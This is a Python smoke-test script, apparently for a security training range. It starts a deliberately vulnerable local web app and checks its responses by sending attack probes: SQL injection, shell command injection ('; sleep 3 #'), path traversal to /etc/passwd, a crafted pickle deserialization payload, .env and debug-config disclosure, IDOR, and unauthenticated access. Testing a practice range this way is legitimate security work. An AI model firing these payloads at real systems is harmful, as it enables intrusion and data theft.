"""本地起靶场，按 B5 探针**实际发出的字节**打一遍，逐条核对判据。

它替 Docker 那一圈做快速迭代 —— 沙箱一轮要几十秒，而这里的问题是
"响应形态对不对"，与本机/容器无关。

用法：uv run --with flask python tools/range_smoke.py ecommerce

放在 `tools/` 而不是后端根目录：它不是产品代码，不会被 `app/` 引用。
"""

from __future__ import annotations

import base64
import json
import os
import pickle
import re
import subprocess
import sys
import time
import urllib.error
import urllib.parse
import urllib.request
from pathlib import Path

#: `parents[0]`=tools、`[1]`=backend、`[2]`=仓库根（含 ranges/）。
#: 直接用下标而不是 `parent.parent.parent`：层级依赖要写成一个数字常量，
#: 挪错位置时下面那句断言会立刻炸，而不是等 `app_dir` 指向空目录。
ROOT = Path(__file__).resolve().parents[2] / "ranges"
if not ROOT.is_dir():  # pragma: no cover - 只在挪错位置时触发
    raise SystemExit(f"找不到 {ROOT}（tools/ 的上一层应是 backend/，再上一层是仓库根）")
PORT = 5000
BASE = f"http://127.0.0.1:{PORT}"
NONCE = "asa0123456789ab"
BOUNDARY = "----ASAProbeBoundary7d1a"
POSIX = os.name == "posix"


def _get(path: str, headers: dict[str, str] | None = None) -> tuple[int, str]:
    req = urllib.request.Request(BASE + path, method="GET")
    for k, v in (headers or {}).items():
        req.add_header(k, v)
    try:
        with urllib.request.urlopen(req, timeout=30) as resp:
            return resp.status, resp.read().decode("utf-8", "replace")
    except urllib.error.HTTPError as exc:
        return exc.code, exc.read().decode("utf-8", "replace")


def _post_form(path: str, field: str, value: str) -> tuple[int, str, int]:
    body = urllib.parse.urlencode({field: value}).encode()
    req = urllib.request.Request(BASE + path, data=body, method="POST")
    req.add_header("Content-Type", "application/x-www-form-urlencoded")
    started = time.monotonic()
    try:
        with urllib.request.urlopen(req, timeout=30) as resp:
            out = (resp.status, resp.read().decode("utf-8", "replace"))
    except urllib.error.HTTPError as exc:
        out = (exc.code, exc.read().decode("utf-8", "replace"))
    return out[0], out[1], int((time.monotonic() - started) * 1000)


def _post_multipart(path: str, field: str, filename: str, content: str) -> tuple[int, str]:
    lines = [
        f"--{BOUNDARY}",
        f'Content-Disposition: form-data; name="{field}"; filename="{filename}"',
        "Content-Type: text/plain",
        "",
        content,
        f"--{BOUNDARY}--",
        "",
    ]
    body = "\r\n".join(lines).encode()
    req = urllib.request.Request(BASE + path, data=body, method="POST")
    req.add_header("Content-Type", f"multipart/form-data; boundary={BOUNDARY}")
    try:
        with urllib.request.urlopen(req, timeout=30) as resp:
            return resp.status, resp.read().decode("utf-8", "replace")
    except urllib.error.HTTPError as exc:
        return exc.code, exc.read().decode("utf-8", "replace")


def _deser_payload(nonce: str) -> str:
    class _Marker:
        def __reduce__(self):
            return (getattr, ("builtins", nonce))

    blob = base64.b64encode(pickle.dumps(_Marker(), protocol=2)).decode("ascii")
    return json.dumps({"data": blob, "marker": nonce}, ensure_ascii=False)


CHECKS: list[tuple[str, str, object]] = []


def check(label: str, ok: bool, detail: str) -> None:
    verdict = "PASS" if ok else "FAIL"
    CHECKS.append((label, verdict, detail))
    # 立刻打印：某一条挂住时，能直接看出挂在哪一条 —— 攒到最后统一打印的话，
    # 超时会把前面已经通过的结论一起吞掉。
    print(f"  [{verdict}] {label:<28} {detail}", flush=True)


def run_ecommerce() -> None:
    # ---- sqli: union_extract ----
    q = urllib.parse.quote(f"1 UNION SELECT '{NONCE}','asa' -- ", safe="")
    _, body = _get(f"/search?q={q}")
    check("sqli/union_extract", NONCE in body, body[:120].replace("\n", " "))

    # ---- sqli: boolean_blind ----
    _, t = _get(f"/search?q={urllib.parse.quote('1 AND 1=1', safe='')}")
    _, f = _get(f"/search?q={urllib.parse.quote('1 AND 1=2', safe='')}")
    _, t2 = _get(f"/search?q={urllib.parse.quote('1 AND 1=1', safe='')}")
    check(
        "sqli/boolean_blind",
        len(t) != len(f) and len(t) == len(t2) and len(t) > 0,
        f"len(true)={len(t)} len(false)={len(f)} len(repeat)={len(t2)}",
    )

    # ---- cmdi / file_read：**只在 POSIX 上验** ----
    #
    # 这两组判据都依赖容器里的 Linux 事实，本机（Windows）验不了：
    #   * 命令注入的载荷用 `;` 与 `#`，而 cmd.exe 既不把 `;` 当分隔符、
    #     也不把 `#` 当注释；
    #   * 文件读取读的是 `/etc/passwd` 与 `/etc/hostname`，Windows 上没有。
    # 显式跳过而不是让它红：把"本机不是 POSIX"报成失败，会让人去查一个
    # 根本不存在的问题。这两组的真实验证在容器里（跑端到端流水线时）。
    if POSIX:
        baseline = _timed(f"/api/ping?host={urllib.parse.quote('; : #asa' + NONCE, safe='')}")
        probe = _timed(f"/api/ping?host={urllib.parse.quote('; sleep 3 #asa' + NONCE, safe='')}")
        delta = probe - baseline
        check("cmdi/time_blind", 2400 <= delta <= 3600, f"delta={delta}ms（基线 {baseline}）")

        _, body = _get(f"/api/ping?host={urllib.parse.quote('; echo ' + NONCE + ' #', safe='')}")
        check("cmdi/echo_nonce", NONCE in body, body[:120].replace("\n", " "))

        _, body = _get(f"/api/file?path={urllib.parse.quote('../../../../etc/passwd', safe='')}")
        check("file_read/passwd", re.search(r"root:[x*]?:0:0:", body) is not None, body[:80])

        _, body = _get(
            f"/api/download?file={urllib.parse.quote('../../../../etc/hostname', safe='')}"
        )
        check(
            "file_read/hostname",
            re.search(r"^[a-f0-9]{12}$", body) is not None,
            repr(body[:40]),
        )
    else:
        for label in (
            "cmdi/time_blind",
            "cmdi/echo_nonce",
            "file_read/passwd",
            "file_read/hostname",
        ):
            CHECKS.append((label, "SKIP", "本机非 POSIX，容器内验证"))

    # ---- file_upload ----
    name = f"{NONCE}.txt"
    status, _ = _post_multipart("/api/upload", "file", name, NONCE)
    _, readback = _get(f"/uploads/{name}")
    check("file_upload", NONCE in readback, f"上传 {status}，回读 {readback[:60]!r}")

    # ---- info_disclosure ----
    pat = re.compile(r"(SECRET_KEY|DB_PASSWORD|DATABASE_URL|API_KEY|PASSWORD|TOKEN)\s*[:=]")
    _, env_body = _get("/.env")
    check("info_disclosure/.env", pat.search(env_body) is not None, env_body.splitlines()[:1])
    _, dbg_body = _get("/debug/config")
    check("info_disclosure/debug", pat.search(dbg_body) is not None, dbg_body.splitlines()[:1])

    # ---- deserialization ----
    status, body, _ = _post_form("/api/deserialize", "data", _deser_payload(NONCE))
    check("deserialization", NONCE in body, f"HTTP {status}: {body[:100]}")


def run_usercenter() -> None:
    # ---- idor：先匿名写，再匿名读别人的资源 ----
    status, body, _ = _post_form("/api/user/profile", "nickname", NONCE)
    _, readback = _get("/api/user/2/profile")
    check(
        "idor/horizontal",
        NONCE in readback,
        f"写入 {status}，回读 {readback[:80]}",
    )

    # ---- unauth_access：无任何凭证取列表 ----
    status, body = _get("/api/user/list")
    parsed_ok = False
    try:
        parsed = json.loads(body)
        parsed_ok = isinstance(parsed, list) and len(parsed) > 0
    except ValueError:
        pass
    check("unauth_access/list", status == 200 and parsed_ok, f"HTTP {status}，{body[:70]}")

    # ---- V7：手机号明文（探针验不了，只能核对响应里确实没脱敏）----
    check(
        "v7/plain_phone",
        "13800000002" in body,
        "列表响应里手机号为明文" if "13800000002" in body else "已脱敏",
    )

    # ---- info_disclosure：/debug/config ----
    pat = re.compile(r"(SECRET_KEY|DB_PASSWORD|DATABASE_URL|API_KEY|PASSWORD|TOKEN)\s*[:=]")
    _, dbg = _get("/debug/config")
    check("info_disclosure/debug", pat.search(dbg) is not None, dbg.splitlines()[:1])


def _timed(path: str) -> int:
    started = time.monotonic()
    _get(path)
    return int((time.monotonic() - started) * 1000)


def main() -> int:
    target = sys.argv[1] if len(sys.argv) > 1 else "ecommerce"
    app_dir = ROOT / target

    proc = subprocess.Popen(
        [sys.executable, "app.py"],
        cwd=app_dir,
        stdout=subprocess.DEVNULL,
        stderr=subprocess.PIPE,
    )
    ready = False
    for _ in range(120):
        if proc.poll() is not None:
            break
        try:
            _get("/")
            ready = True
            break
        except Exception:
            time.sleep(0.25)

    if not ready and proc.poll() is not None:
        err = (proc.stderr.read() or b"").decode("utf-8", "replace")
        print("靶场启动失败：\n" + err[-2000:])
        return 2

    try:
        (run_ecommerce if target == "ecommerce" else run_usercenter)()
    finally:
        proc.terminate()
        try:
            proc.wait(timeout=10)
        except subprocess.TimeoutExpired:
            proc.kill()

    width = max(len(c[0]) for c in CHECKS)
    failed = 0
    for label, verdict, detail in CHECKS:
        print(f"  [{verdict}] {label:<{width}}  {detail}")
        failed += verdict == "FAIL"
    print(f"\n{len(CHECKS) - failed}/{len(CHECKS)} 通过")
    return 1 if failed else 0


if __name__ == "__main__":
    raise SystemExit(main())
